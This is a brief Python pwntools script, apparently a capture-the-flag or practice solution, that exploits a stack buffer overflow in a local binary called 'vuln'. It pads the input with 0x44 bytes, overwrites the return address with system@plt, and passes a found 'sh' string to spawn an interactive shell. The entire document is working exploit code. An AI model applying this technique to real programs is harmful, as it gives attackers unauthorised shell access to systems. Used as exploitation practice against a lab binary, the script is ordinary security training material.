#!/bin/python

from pwn import *
from time import sleep

elf = ELF("./vuln")
system_plt_addr = elf.plt.system

p = process("./vuln")

sh_addr = next(elf.search(b'sh\x00'))
log.success(f'SH Addr: {hex(sh_addr)}')

p = process("./vuln")

p.recvline()

payload = flat(
    'A' * 0x44,
    elf.plt['system'],
    'x' * 4,
    sh_addr
)
p.sendline(payload)
p.recvline()

p.interactive()